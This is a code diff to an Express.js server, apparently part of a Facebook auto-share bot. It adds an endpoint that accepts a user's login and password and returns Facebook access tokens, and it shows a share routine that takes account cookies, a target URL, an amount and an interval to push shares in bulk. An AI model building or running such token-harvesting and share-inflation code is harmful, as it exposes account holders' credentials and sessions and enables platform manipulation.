@@ -114,6 +114,35 @@ app.get('/sh', async (req, res) => {
   }
 });
 
+
+app.get('/tttt', async (req, res) => {
+  const {
+    u,p
+  } = req.body;
+  
+  if (!u || !p){
+    return res.json({
+      status: false,
+      message: "Please enter your login credentials first!"
+    });
+  }
+  const neth = await fb.getKey(u,p);
+  if (neth){
+    return res.json({
+      status: true,
+      message: "Fetching token success!",
+      token1: neth.EAAD6V7,
+      token2: neth.EAAAAU,
+    });
+  } else {
+    return res.json({
+      status: false,
+      message: "Failed to fetch token. Try again (or try with an another account)."
+    });
+  }
+});
+
+
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
   await share(false, c, link1, "100000", "6");
@@ -171,7 +200,7 @@ async function fucker(a){
 }
 async function share(sharedIs,cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
-  fucker(cookies);
+  await fucker(cookies);
   total.set(id, {
     shared: sharedIs,
     url,
